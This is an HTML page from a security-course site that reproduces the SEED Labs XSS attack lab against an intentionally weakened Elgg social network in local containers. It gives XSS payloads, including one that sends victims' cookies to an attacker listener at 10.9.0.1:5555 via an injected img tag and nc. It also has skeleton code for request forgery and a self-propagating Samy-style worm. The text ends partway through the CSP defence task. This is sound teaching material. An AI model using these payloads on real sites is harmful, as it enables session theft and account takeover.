@@ -1,0 +1,955 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  
+  <title>Cross-Site Scripting (XSS) Attack Lab &mdash; Network Security Lab  documentation</title>
+  
+
+  
+  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+
+  
+  
+
+  
+  
+
+  
+
+  
+  <!--[if lt IE 9]>
+    <script src="../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
+        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
+        <script src="../../_static/jquery.js"></script>
+        <script src="../../_static/underscore.js"></script>
+        <script src="../../_static/doctools.js"></script>
+    
+    <script type="text/javascript" src="../../_static/js/theme.js"></script>
+
+    
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Cross-Site Request Forgery (CSRF) Attack Lab" href="Web_CSRF_Elgg.html" />
+    <link rel="prev" title="Web Security Labs" href="web_index.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
+
+          
+            <a href="../../index.html" class="icon icon-home"> Network Security Lab
+          
+
+          
+          </a>
+
+          
+            
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../../xie/xie_labs.html">Xie Labs</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../seed_index.html">SEED Labs</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="../crypto/crypto_index.html">Cryptography Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../hardware/hardware_index.html">Hardware Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../mobile/mobile_index.html">Mobile Security Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../network/network_index.html">Network Security Labs</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="web_index.html">Web Security Labs</a><ul class="current">
+<li class="toctree-l3 current"><a class="current reference internal" href="#">Cross-Site Scripting (XSS) Attack Lab</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#overview">Overview</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#lab-environment">Lab Environment</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-1-posting-a-malicious-message-to-display-an-alert-window">Task 1: Posting a Malicious Message to Display an Alert Window</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-2-posting-a-malicious-message-to-display-cookies">Task 2: Posting a Malicious Message to Display Cookies</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-3-stealing-cookies-from-the-victims-machine">Task 3: Stealing Cookies from the Victim’s Machine</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-4-becoming-the-victims-friend">Task 4: Becoming the Victim’s Friend</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-5-modifying-the-victims-profile">Task 5: Modifying the Victim’s Profile</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-6-writing-a-self-propagating-xss-worm">Task 6: Writing a Self-Propagating XSS Worm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-7-defeating-xss-attacks-using-csp">Task 7: Defeating XSS Attacks Using CSP</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#guidelines">Guidelines</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#submission">Submission</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="Web_CSRF_Elgg.html">Cross-Site Request Forgery (CSRF) Attack Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="Web_SQL_Injection.html">SQL Injection Attack Lab</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../software/software_index.html">Software Security Labs</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../../website_link/web_index.html"><strong>Return To Website</strong></a></li>
+</ul>
+
+            
+          
+        </div>
+        
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">Network Security Lab</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../../index.html" class="icon icon-home"></a> &raquo;</li>
+        
+          <li><a href="../seed_index.html">SEED Labs</a> &raquo;</li>
+        
+          <li><a href="web_index.html">Web Security Labs</a> &raquo;</li>
+        
+      <li>Cross-Site Scripting (XSS) Attack Lab</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="cross-site-scripting-xss-attack-lab">
+<h1>Cross-Site Scripting (XSS) Attack Lab<a class="headerlink" href="#cross-site-scripting-xss-attack-lab" title="Permalink to this headline">¶</a></h1>
+<p>(Web Application: Elgg)</p>
+<div class="section" id="overview">
+<h2>Overview<a class="headerlink" href="#overview" title="Permalink to this headline">¶</a></h2>
+<p>Cross-site scripting (XSS) is a type of vulnerability commonly found in
+web applications. This vulnerability makes it possible for attackers to
+inject malicious code (e.g. JavaScript programs) into victim’s web
+browser. Using this malicious code, attackers can steal a victim’s
+credentials, such as session cookies. The access control policies (i.e.,
+the same origin policy) employed by browsers to protect those
+credentials can be bypassed by exploiting XSS vulnerabilities.</p>
+<p>To demonstrate what attackers can do by exploiting XSS vulnerabilities,
+we have set up a web application named Elgg in our pre-built Ubuntu VM
+image. Elgg is a very popular open-source web application for social
+network, and it has implemented a number of countermeasures to remedy
+the XSS threat. To demonstrate how XSS attacks work, we have commented
+out these countermeasures in Elgg in our installation, intentionally
+making Elgg vulnerable to XSS attacks. Without the countermeasures,
+users can post any arbitrary message, including JavaScript programs, to
+the user profiles.</p>
+<p>In this lab, students need to exploit this vulnerability to launch an
+XSS attack on the modified Elgg, in a way that is similar to what Samy
+Kamkar did to MySpace in 2005 through the notorious Samy worm. The
+ultimate goal of this attack is to spread an XSS worm among the users,
+such that whoever views an infected user profile will be infected, and
+whoever is infected will add you (i.e., the attacker) to his/her friend
+list. This lab covers the following topics:</p>
+<ul class="simple">
+<li><p>Cross-Site Scripting attack</p></li>
+<li><p>XSS worm and self-propagation</p></li>
+<li><p>Session cookies</p></li>
+<li><p>HTTP GET and POST requests</p></li>
+<li><p>JavaScript and Ajax</p></li>
+<li><p>Content Security Policy (CSP)</p></li>
+</ul>
+<div class="section" id="readings">
+<h3>Readings<a class="headerlink" href="#readings" title="Permalink to this headline">¶</a></h3>
+<p>Detailed coverage of the Cross-Site Scripting attack can be found in the
+following:</p>
+<ul class="simple">
+<li><p>Chapter 10 of the SEED Book, Computer &amp; Internet Security: A Hands-on Approach, 2nd Edition,
+by Wenliang Du. See details at <a class="reference external" href="https://www.handsonsecurity.net">https://www.handsonsecurity.net</a>.</p></li>
+</ul>
+</div>
+<div class="section" id="lab-environment-setup">
+<h3>Lab environment setup<a class="headerlink" href="#lab-environment-setup" title="Permalink to this headline">¶</a></h3>
+<p>This lab has been tested on our pre-built Ubuntu 20.04 VM, which can be downloaded
+from the SEED website. Since we use containers to set up the lab environment, this lab does not depend
+much on the SEED VM. You can do this lab using other VMs, physical machines, or VMs on the cloud.</p>
+</div>
+</div>
+<div class="section" id="lab-environment">
+<h2>Lab Environment<a class="headerlink" href="#lab-environment" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="dns-setup">
+<h3>DNS Setup<a class="headerlink" href="#dns-setup" title="Permalink to this headline">¶</a></h3>
+<p>We have set up several websites for this lab. They are hosted by the
+container <code class="docutils literal notranslate"><span class="pre">10.9.0.5</span></code>. We need to map the names of the web server to
+this IP address. Please add the following entries to <code class="docutils literal notranslate"><span class="pre">/etc/hosts</span></code>. You
+need to use the root privilege to modify this file:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>10.9.0.5        www.seed-server.com
+10.9.0.5        www.example32a.com
+10.9.0.5        www.example32b.com
+10.9.0.5        www.example32c.com
+10.9.0.5        www.example60.com
+10.9.0.5        www.example70.com
+</pre></div>
+</div>
+</div>
+<div class="section" id="container-setup-and-commands">
+<h3>Container Setup and Commands<a class="headerlink" href="#container-setup-and-commands" title="Permalink to this headline">¶</a></h3>
+<p>Please download the <code class="docutils literal notranslate"><span class="pre">Labsetup.zip</span></code> file to your VM from the lab’s website, unzip it, enter the <code class="docutils literal notranslate"><span class="pre">Labsetup</span></code>
+folder, and use the <code class="docutils literal notranslate"><span class="pre">docker-compose.yml</span></code> file to set up the lab environment. Detailed explanation of the
+content in this file and all the involved <code class="docutils literal notranslate"><span class="pre">Dockerfile</span></code> can be found from the user manual, which is linked
+to the website of this lab. If this is the first time you set up a SEED lab environment using containers, it is
+very important that you read the user manual.</p>
+<p>In the following, we list some of the commonly used commands related to Docker and Compose. Since
+we are going to use these commands very frequently, we have created aliases for them in the <code class="docutils literal notranslate"><span class="pre">.bashrc</span></code> file
+(in our provided SEEDUbuntu 20.04 VM).</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ docker-compose build     # Build the container image
+$ docker-compose up        # Start the container
+$ docker-compose down      # Shut down the container
+
+// Aliases for the Compose commands above
+$ dcbuild                  # Alias for: docker-compose build
+$ dcup                     # Alias for: docker-compose up
+$ dcdown                   # Alias for: docker-compose down
+</pre></div>
+</div>
+<p>All the containers will be running in the background. To run commands on a container, we often need
+to get a shell on that container. We first need to use the “<code class="docutils literal notranslate"><span class="pre">docker</span> <span class="pre">ps</span></code>” command to find out the ID of
+the container, and then use “<code class="docutils literal notranslate"><span class="pre">docker</span> <span class="pre">exec</span></code>” to start a shell on that container. We have created aliases for
+them in the <code class="docutils literal notranslate"><span class="pre">.bashrc</span></code> file.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ dockps         // Alias for: docker ps --format &quot;{{.ID}} {{.Names}}&quot;
+$ docksh &lt;id&gt;    // Alias for: docker exec -it &lt;id&gt; /bin/bash
+
+// The following example shows how to get a shell inside hostC
+$ dockps
+b1004832e275 hostA-10.9.0.5
+0af4ea7a3e2e hostB-10.9.0.6
+9652715c8e0a hostC-10.9.0.7
+
+$ docksh 96
+root@9652715c8e0a:/#
+
+// Note: If a docker command requires a container ID, you do not need to
+// type the entire ID string. Typing the first few characters will
+// be sufficient, as long as they are unique among all the containers.
+</pre></div>
+</div>
+<p>If you encounter problems when setting up the lab environment, please read the “Common Problems”
+section of the manual for potential solutions.</p>
+</div>
+<div class="section" id="elgg-web-application">
+<h3>Elgg Web Application<a class="headerlink" href="#elgg-web-application" title="Permalink to this headline">¶</a></h3>
+<p>We use an open-source web application called Elgg in this lab. Elgg is a
+web-based social-networking application. It is already set up in the
+provided container images; its URL is <a class="reference external" href="http://www.seed-server.com">http://www.seed-server.com</a>. We use
+two containers, one running the web server (<code class="docutils literal notranslate"><span class="pre">10.9.0.5</span></code>) , and the
+other running the MySQL database (<code class="docutils literal notranslate"><span class="pre">10.9.0.6</span></code>). The IP addresses for
+these two containers are hardcoded in various places in the
+configuration, so please do not change them from the
+<code class="docutils literal notranslate"><span class="pre">docker-compose.yml</span></code> file.</p>
+<p><strong>MySQL database</strong>. Containers are usually disposable, so once it is destroyed, all the data inside the containers are lost. For this lab, we do want to keep the data in the MySQL database, so we do not lose
+our work when we shutdown our container. To achieve this, we have mounted the mysql data folder
+on the host machine (inside Labsetup, it will be created after the MySQL container runs once) to the
+<code class="docutils literal notranslate"><span class="pre">/var/lib/mysql</span></code> folder inside the MySQL container. This folder is where MySQL stores its database.
+Therefore, even if the container is destroyed, data in the database are still kept. If you do want to start from
+a clean database, you can remove this folder:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ sudo rm -rf mysql_data
+</pre></div>
+</div>
+<p><strong>User accounts</strong>. We have created several user accounts on the Elgg server; the user name and passwords
+are given in the following.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>----------------------------
+UserName | Password
+----------------------------
+admin    | seedelgg
+alice    | seedalice
+boby     | seedboby
+charlie  | seedcharlie
+samy     | seedsamy
+----------------------------
+</pre></div>
+</div>
+</div>
+<div class="section" id="lab-tasks">
+<h3>Lab Tasks<a class="headerlink" href="#lab-tasks" title="Permalink to this headline">¶</a></h3>
+<p>When you copy and paste code from this PDF file, very often, the
+quotation marks, especially single quote, may turn into a different
+symbol that looks similar. They will cause errors in the code, so keep
+that in mind. When that happens, delete them, and manually type those
+symbols.</p>
+</div>
+<div class="section" id="preparation-getting-familiar-with-the-http-header-live-tool">
+<h3>Preparation: Getting Familiar with the <code class="docutils literal notranslate"><span class="pre">&quot;HTTP</span> <span class="pre">Header</span> <span class="pre">Live&quot;</span></code> tool<a class="headerlink" href="#preparation-getting-familiar-with-the-http-header-live-tool" title="Permalink to this headline">¶</a></h3>
+<p>In this lab, we need to construct HTTP requests. To figure out what an
+acceptable HTTP request in Elgg looks like, we need to be able to
+capture and analyze HTTP requests. We can use a Firefox add-on called
+<code class="docutils literal notranslate"><span class="pre">&quot;HTTP</span> <span class="pre">Header</span> <span class="pre">Live&quot;</span></code> for this purpose. Before you start working on
+this lab, you should get familiar with this tool. Instructions on how to
+use this tool is given in the Guideline section.</p>
+</div>
+</div>
+<div class="section" id="task-1-posting-a-malicious-message-to-display-an-alert-window">
+<h2>Task 1: Posting a Malicious Message to Display an Alert Window<a class="headerlink" href="#task-1-posting-a-malicious-message-to-display-an-alert-window" title="Permalink to this headline">¶</a></h2>
+<p>The objective of this task is to embed a JavaScript program in your Elgg
+profile, such that when another user views your profile, the JavaScript
+program will be executed and an alert window will be displayed. The
+following JavaScript program will display an alert window:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;
+</pre></div>
+</div>
+<p>If you embed the above JavaScript code in your profile (e.g. in the
+brief description field), then any user who views your profile will see
+the alert window.</p>
+<p>In this case, the JavaScript code is short enough to be typed into the
+short description field. If you want to run a long JavaScript, but you
+are limited by the number of characters you can type in the form, you
+can store the JavaScript program in a standalone file, save it with the
+.js extension, and then refer to it using the src attribute in the
+&lt;script&gt; tag. See the following example:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>&lt;script type=&quot;text/javascript&quot;
+        src=&quot;http://www.example.com/myscripts.js&quot;&gt;
+&lt;/script&gt;
+</pre></div>
+</div>
+<p>In the above example, the page will fetch the JavaScript program from
+<a class="reference external" href="http://www.example.com">http://www.example.com</a>, which can be any web server.</p>
+</div>
+<div class="section" id="task-2-posting-a-malicious-message-to-display-cookies">
+<h2>Task 2: Posting a Malicious Message to Display Cookies<a class="headerlink" href="#task-2-posting-a-malicious-message-to-display-cookies" title="Permalink to this headline">¶</a></h2>
+<p>The objective of this task is to embed a JavaScript program in your Elgg
+profile, such that when another user views your profile, the user’s
+cookies will be displayed in the alert window. This can be done by
+adding some additional code to the JavaScript program in the previous
+task:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+</pre></div>
+</div>
+</div>
+<div class="section" id="task-3-stealing-cookies-from-the-victims-machine">
+<h2>Task 3: Stealing Cookies from the Victim’s Machine<a class="headerlink" href="#task-3-stealing-cookies-from-the-victims-machine" title="Permalink to this headline">¶</a></h2>
+<p>In the previous task, the malicious JavaScript code written by the
+attacker can print out the user’s cookies, but only the user can see the
+cookies, not the attacker. In this task, the attacker wants the
+JavaScript code to send the cookies to himself/herself. To achieve this,
+the malicious JavaScript code needs to send an HTTP request to the
+attacker, with the cookies appended to the request.</p>
+<p>We can do this by having the malicious JavaScript insert an
+&lt;img&gt; tag with its src attribute set to the
+attacker’s machine. When the JavaScript inserts the img tag, the browser
+tries to load the image from the URL in the src field; this results in
+an HTTP GET request sent to the attacker’s machine. The JavaScript given
+below sends the cookies to the port 5555 of the attacker’s machine (with
+IP address 10.9.0.1), where the attacker has a TCP server listening to
+the same port.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>&lt;script&gt;document.write(&#39;&lt;img src=http://10.9.0.1:5555?c=&#39;
+                       + escape(document.cookie) + &#39;   &gt;&#39;);
+&lt;/script&gt;
+</pre></div>
+</div>
+<p>A commonly used program by attackers is <code class="docutils literal notranslate"><span class="pre">netcat</span></code> (or <code class="docutils literal notranslate"><span class="pre">nc</span></code>) , which,
+if running with the <code class="docutils literal notranslate"><span class="pre">&quot;-l&quot;</span></code> option, becomes a TCP server that listens
+for a connection on the specified port. This server program basically
+prints out whatever is sent by the client and sends to the client
+whatever is typed by the user running the server. Type the command below
+to listen on port <code class="docutils literal notranslate"><span class="pre">5555</span></code>:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ nc -lknv 5555
+</pre></div>
+</div>
+<p>The <code class="docutils literal notranslate"><span class="pre">-l</span></code> option is used to specify that nc should listen for an
+incoming connection rather than initiate a connection to a remote host.
+The <code class="docutils literal notranslate"><span class="pre">-nv</span></code> option is used to have <code class="docutils literal notranslate"><span class="pre">nc</span></code> give more verbose output. The
+<code class="docutils literal notranslate"><span class="pre">-k</span></code> option means when a connection is completed, listen for another
+one.</p>
+</div>
+<div class="section" id="task-4-becoming-the-victims-friend">
+<h2>Task 4: Becoming the Victim’s Friend<a class="headerlink" href="#task-4-becoming-the-victims-friend" title="Permalink to this headline">¶</a></h2>
+<p>In this and next task, we will perform an attack similar to what Samy
+did to MySpace in 2005 (i.e. the Samy Worm). We will write an XSS worm
+that adds Samy as a friend to any other user that visits Samy’s page.
+This worm does not self-propagate; in task 6, we will make it
+self-propagating.</p>
+<p>In this task, we need to write a malicious JavaScript program that
+forges HTTP requests directly from the victim’s browser, without the
+intervention of the attacker. The objective of the attack is to add Samy
+as a friend to the victim. We have already created a user called Samy on
+the Elgg server (the user name is samy).</p>
+<p>To add a friend for the victim, we should first find out how a
+legitimate user adds a friend in Elgg. More specifically, we need to
+figure out what are sent to the server when a user adds a friend.
+Firefox’s <code class="docutils literal notranslate"><span class="pre">HTTP</span></code> inspection tool can help us get the information. It
+can display the contents of any HTTP request message sent from the
+browser. From the contents, we can identify all the parameters in the
+request. Section 5 provides guidelines on how to use the tool.</p>
+<p>Once we understand what the add-friend HTTP request look like, we can
+write a JavaScript program to send out the same HTTP request. We provide
+a skeleton JavaScript code that aids in completing the task.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>&lt;script type=&quot;text/javascript&quot;&gt;
+window.onload = function () {
+  var Ajax=null;
+
+  var ts=&quot;&amp;__elgg_ts=&quot;+elgg.security.token.__elgg_ts;          ➀
+  var token=&quot;&amp;__elgg_token=&quot;+elgg.security.token.__elgg_token; ➁
+
+  //Construct the HTTP request to add Samy as a friend.
+  var sendurl=...;  //FILL IN
+
+  //Create and send Ajax request to add friend
+  Ajax=new XMLHttpRequest();
+  Ajax.open(&quot;GET&quot;, sendurl, true);
+  Ajax.send();
+}
+&lt;/script&gt;
+</pre></div>
+</div>
+<p>The above code should be placed in the <code class="docutils literal notranslate"><span class="pre">&quot;About</span> <span class="pre">Me&quot;</span></code> field of Samy’s
+profile page. This field provides two editing modes: Editor mode
+(default) and Text mode. The Editor mode adds extra HTML code to the
+text typed into the field, while the Text mode does not. Since we do not
+want any extra code added to our attacking code, the Text mode should be
+enabled before entering the above JavaScript code. This can be done by
+clicking on <code class="docutils literal notranslate"><span class="pre">&quot;Edit</span> <span class="pre">HTML&quot;</span></code>, which can be found at the top right of the
+<code class="docutils literal notranslate"><span class="pre">&quot;About</span> <span class="pre">Me&quot;</span></code> text field.</p>
+<div class="section" id="questions">
+<h3>Questions<a class="headerlink" href="#questions" title="Permalink to this headline">¶</a></h3>
+<p>Please answer the following questions:</p>
+<ul class="simple">
+<li><p><strong>Question 1:</strong> Explain the purpose of Lines ➀ and ➁, why are they are
+needed?</p></li>
+<li><p><strong>Question 2:</strong> If the <code class="docutils literal notranslate"><span class="pre">Elgg</span></code> application only provide the Editor
+mode for the <code class="docutils literal notranslate"><span class="pre">&quot;About</span> <span class="pre">Me&quot;</span></code> field, i.e., you cannot switch to the
+Text mode, can you still launch a successful attack?</p></li>
+</ul>
+</div>
+</div>
+<div class="section" id="task-5-modifying-the-victims-profile">
+<h2>Task 5: Modifying the Victim’s Profile<a class="headerlink" href="#task-5-modifying-the-victims-profile" title="Permalink to this headline">¶</a></h2>
+<p>The objective of this task is to modify the victim’s profile when the
+victim visits Samy’s page. Specifically, modify the victim’s
+<code class="docutils literal notranslate"><span class="pre">&quot;About</span> <span class="pre">Me&quot;</span></code> field. We will write an XSS worm to complete the task.
+This worm does not self-propagate; in task 6, we will make it
+self-propagating.</p>
+<p>Similar to the previous task, we need to write a malicious JavaScript
+program that forges HTTP requests directly from the victim’s browser,
+without the intervention of the attacker. To modify profile, we should
+first find out how a legitimate user edits or modifies his/her profile
+in Elgg. More specifically, we need to figure out how the HTTP POST
+request is constructed to modify a user’s profile. We will use Firefox’s
+HTTP inspection tool. Once we understand how the modify-profile HTTP
+POST request looks like, we can write a JavaScript program to send out
+the same HTTP request. We provide a skeleton JavaScript code that aids
+in completing the task.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>&lt;script type=&quot;text/javascript&quot;&gt;
+window.onload = function(){
+  //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+  //and Security Token __elgg_token
+  var userName=&quot;&amp;name=&quot;+elgg.session.user.name;
+  var guid=&quot;&amp;guid=&quot;+elgg.session.user.guid;
+  var ts=&quot;&amp;__elgg_ts=&quot;+elgg.security.token.__elgg_ts;
+  var token=&quot;&amp;__elgg_token=&quot;+elgg.security.token.__elgg_token;
+
+  //Construct the content of your url.
+  var content=...;     //FILL IN
+
+  var samyGuid=...;    //FILL IN
+
+  var sendurl=...;     //FILL IN
+
+  if(elgg.session.user.guid!=samyGuid)           ➀
+  {
+     //Create and send Ajax request to modify profile
+     var Ajax=null;
+     Ajax=new XMLHttpRequest();
+     Ajax.open(&quot;POST&quot;, sendurl, true);
+     Ajax.setRequestHeader(&quot;Content-Type&quot;,
+                           &quot;application/x-www-form-urlencoded&quot;);
+     Ajax.send(content);
+  }
+}
+&lt;/script&gt;
+</pre></div>
+</div>
+<p>Similar to Task 4, the above code should be placed in the <code class="docutils literal notranslate"><span class="pre">&quot;About</span> <span class="pre">Me&quot;</span></code>
+field of Samy’s profile page, and the Text mode should be enabled before
+entering the above JavaScript code.</p>
+<div class="section" id="questions-2">
+<h3>Questions 2<a class="headerlink" href="#questions-2" title="Permalink to this headline">¶</a></h3>
+<p>Please answer the following questions:</p>
+<ul class="simple">
+<li><p><strong>Question 3:</strong> Why do we need Line ➀? Remove this line, and repeat
+your attack. Report and explain your observation.</p></li>
+</ul>
+</div>
+</div>
+<div class="section" id="task-6-writing-a-self-propagating-xss-worm">
+<h2>Task 6: Writing a Self-Propagating XSS Worm<a class="headerlink" href="#task-6-writing-a-self-propagating-xss-worm" title="Permalink to this headline">¶</a></h2>
+<p>To become a real worm, the malicious JavaScript program should be able
+to propagate itself. Namely, whenever some people view an infected
+profile, not only will their profiles be modified, the worm will also be
+propagated to their profiles, further affecting others who view these
+newly infected profiles. This way, the more people view the infected
+profiles, the faster the worm can propagate. This is exactly the same
+mechanism used by the Samy Worm: within just 20 hours of its October 4,
+2005 release, over one million users were affected, making Samy one of
+the fastest spreading viruses of all time. The JavaScript code that can
+achieve this is called a self-propagating cross-site scripting worm. In
+this task, you need to implement such a worm, which not only modifies
+the victim’s profile and adds the user “Samy” as a friend, but also add
+a copy of the worm itself to the victim’s profile, so the victim is
+turned into an attacker.</p>
+<p>To achieve self-propagation, when the malicious JavaScript modifies the
+victim’s profile, it should copy itself to the victim’s profile. There
+are several approaches to achieve this, and we will discuss two common
+approaches.</p>
+<div class="section" id="link-approach">
+<h3>Link Approach:<a class="headerlink" href="#link-approach" title="Permalink to this headline">¶</a></h3>
+<p>If the worm is included using the src attribute in the &lt;script&gt; tag,
+writing self-propagating worms is much easier. We have discussed the src
+attribute in Task 1, and an example is given below. The worm can simply
+copy the following &lt;script&gt; tag to the victim’s profile, essentially
+infecting the profile with the same worm.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.example.com/xss_worm.js&quot;&gt;
+&lt;/script&gt;
+</pre></div>
+</div>
+</div>
+<div class="section" id="dom-approach">
+<h3>DOM Approach:<a class="headerlink" href="#dom-approach" title="Permalink to this headline">¶</a></h3>
+<p>If the entire JavaScript program (i.e., the worm) is embedded in the
+infected profile, to propagate the worm to another profile, the worm
+code can use DOM APIs to retrieve a copy of itself from the web page. An
+example of using DOM APIs is given below. This code gets a copy of
+itself, and displays it in an alert window:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>&lt;script id=&quot;worm&quot;&gt;
+   var headerTag = &quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;; ➀
+   var jsCode = document.getElementById(&quot;worm&quot;).innerHTML;          ➁
+   var tailTag = &quot;&lt;/&quot; + &quot;script&gt;&quot;;                                  ➂
+
+   var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); ➃
+
+   alert(jsCode);
+&lt;/script&gt;
+</pre></div>
+</div>
+<p>It should be noted that innerHTML (line ➁) only gives us the inside part
+of the code, not including the surrounding script tags. We just need to
+add the beginning tag &lt;script id=”worm”&gt; (line ➀) and the ending tag
+&lt;/script&gt; (line ➂) to form an identical copy of the malicious code.</p>
+<p>When data are sent in HTTP POST requests with the Content-Type set to
+application/x-www-
+form-urlencoded, which is the type used in our code, the data should
+also be encoded. The encoding scheme is called <em>URL encoding</em>, which
+replaces non-alphanumeric characters in the data with %HH, a percentage
+sign and two hexadecimal digits representing the ASCII code of the
+character. The encodeURIComponent() function in line ➃ is used to URL-encode a string.</p>
+<p><strong>Note:</strong> In this lab, you can try both Link and DOM approaches, but the DOM
+approach is required, because it is more challenging and it does not
+rely on external JavaScript code.</p>
+</div>
+<div class="section" id="elggs-countermeasures">
+<h3>Elgg’s Countermeasures<a class="headerlink" href="#elggs-countermeasures" title="Permalink to this headline">¶</a></h3>
+<p>This sub-section is only for information, and there is no specific task
+to do. It shows how Elgg defends against the XSS attack. Elgg does have
+built-in countermeasures, and we have disabled them to make the attack
+work. Actually, Elgg uses two countermeasures. One is a custom built
+security plugin <code class="docutils literal notranslate"><span class="pre">HTMLawed</span></code>, which validates the user input and removes
+the tags from the input. We have commented out the invocation of the
+plugin inside the <code class="docutils literal notranslate"><span class="pre">filter_tags()</span></code> function in <code class="docutils literal notranslate"><span class="pre">input.php</span></code>, which is
+located inside . See the following:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>function filter_tags($var) {
+   // return elgg_trigger_plugin_hook(&#39;validate&#39;, &#39;input&#39;, null, $var);
+   return $var;
+}
+</pre></div>
+</div>
+<p>In addition to HTMLawed, Elgg also uses PHP’s built-in method
+<code class="docutils literal notranslate"><span class="pre">htmlspecialchars()</span></code> to encode the special characters in user input,
+such as encoding “&lt;” to “&amp;lt”, “&gt;” to “&amp;gt”, etc. This method is invoked
+in <code class="docutils literal notranslate"><span class="pre">dropdown.php</span></code>, <code class="docutils literal notranslate"><span class="pre">text.php</span></code>, and <code class="docutils literal notranslate"><span class="pre">url.php</span></code> inside the vendor/elgg/elgg/views/
+default/output/ folder. We have commented them out to turn off the countermeasure.</p>
+</div>
+</div>
+<div class="section" id="task-7-defeating-xss-attacks-using-csp">
+<h2>Task 7: Defeating XSS Attacks Using CSP<a class="headerlink" href="#task-7-defeating-xss-attacks-using-csp" title="Permalink to this headline">¶</a></h2>
+<p>The fundamental problem of the XSS vulnerability is that HTML allows
+JavaScript code to be mixed with data. Therefore, to fix this
+fundamental problem, we need to separate code from data. There are two
+ways to include JavaScript code inside an HTML page, one is the inline
+approach, and the other is the link approach. The inline approach
+directly places code inside the page, while the link approach puts the
+code in an external file, and then link to it from inside the page.</p>
+<p>The inline approach is the culprit of the XSS vulnerability, because
+browsers do not know where the code originally comes from: is it from
+the trusted web server or from untrusted users? Without such knowledge,
+browsers do not know which code is safe to execute, and which one is
+dangerous. The link approach provides a very important piece of
+information to browsers, i.e., where the code comes from. Websites can
+then tell browsers which sources are trustworthy, so browsers know which
+piece of code is safe to execute. Although attackers can also use the
+link approach to include code in their input, they cannot place their
+code in those trustworthy places.</p>
